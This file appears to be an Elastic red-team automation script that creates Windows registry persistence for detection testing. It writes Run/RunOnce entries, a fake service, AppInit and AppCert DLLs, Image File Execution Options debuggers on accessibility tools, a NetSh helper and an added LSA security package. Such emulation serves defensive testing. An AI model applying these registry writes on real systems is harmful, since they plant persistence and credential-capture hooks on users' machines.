# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License;
# you may not use this file except in compliance with the Elastic License.

# Name: Registry persistence creation
# RTA: registry_persistence_create.py
# ATT&CK: T1015, T1103
# Description: Creates registry persistence for mock malware in Run and RunOnce keys, Services, NetSH and debuggers.

# TODO: Split into multiple files
import time

from . import common

TARGET_APP = common.get_path("bin", "myapp.exe")


def pause():
    time.sleep(0.5)


@common.requires_os(common.WINDOWS)
@common.dependencies(TARGET_APP)
def main():
    common.log("Suspicious Registry Persistence")
    winreg = common.get_winreg()

    for hive in (common.HKLM, common.HKCU):
        common.write_reg(hive, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\", "RunOnceTest", TARGET_APP)
        common.write_reg(hive, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", "RunTest", TARGET_APP)

    # create Services subkey for "ServiceTest"
    common.log("Creating ServiceTest registry key")
    hklm = winreg.HKEY_LOCAL_MACHINE
    hkey = winreg.CreateKey(hklm, "System\\CurrentControlSet\\Services\\ServiceTest\\")

    # create "ServiceTest" data values
    common.log("Updating ServiceTest metadata")
    winreg.SetValueEx(hkey, "Description", 0, winreg.REG_SZ, "A fake service")
    winreg.SetValueEx(hkey, "DisplayName", 0, winreg.REG_SZ, "ServiceTest Service")
    winreg.SetValueEx(hkey, "ImagePath", 0, winreg.REG_SZ, "c:\\ServiceTest.exe")
    winreg.SetValueEx(hkey, "ServiceDLL", 0, winreg.REG_SZ, "C:\\ServiceTest.dll")

    # modify contents of ServiceDLL and ImagePath
    common.log("Modifying ServiceTest binary")
    winreg.SetValueEx(hkey, "ImagePath", 0, winreg.REG_SZ, "c:\\ServiceTestMod.exe")
    winreg.SetValueEx(hkey, "ServiceDLL", 0, winreg.REG_SZ, "c:\\ServiceTestMod.dll")

    hkey.Close()
    common.pause()

    # delete Service subkey for "ServiceTest"
    common.log("Removing ServiceTest", log_type="-")
    hkey = winreg.CreateKey(hklm, "System\\CurrentControlSet\\Services\\")
    winreg.DeleteKeyEx(hkey, "ServiceTest")

    hkey.Close()
    common.pause()

    # Additional persistence
    common.log("Adding AppInit DLL")
    windows_base = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\"
    common.write_reg(common.HKLM, windows_base, "AppInit_Dlls", "evil.dll", restore=True, pause=True)

    common.log("Adding AppCert DLL")
    appcertdlls_key = "System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls"
    common.write_reg(common.HKLM, appcertdlls_key, "evil", "evil.dll", restore=True, pause=True)

    debugger_targets = [
        "normalprogram.exe", "sethc.exe", "utilman.exe", "magnify.exe",
        "narrator.exe", "osk.exe", "displayswitch.exe", "atbroker.exe"
    ]

    for victim in debugger_targets:
        common.log("Registering Image File Execution Options debugger for %s -> %s" % (victim, TARGET_APP))
        base_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s" % victim
        common.write_reg(common.HKLM, base_key, "Debugger", TARGET_APP, restore=True)

    # create new NetSh key value
    common.log("Adding a new NetSh Helper DLL")
    key = "Software\\Microsoft\\NetSh"
    common.write_reg(common.HKLM, key, "BadHelper", "c:\\windows\\system32\\BadHelper.dll")

    # modify the list of SSPs
    common.log("Adding a new SSP to the list of security packages")
    key = "System\\CurrentControlSet\\Control\\Lsa"
    common.write_reg(common.HKLM, key, "Security Packages", ["evilSSP"], common.MULTI_SZ, append=True, pause=True)

    hkey.Close()
    pause()


if __name__ == "__main__":
    exit(main())
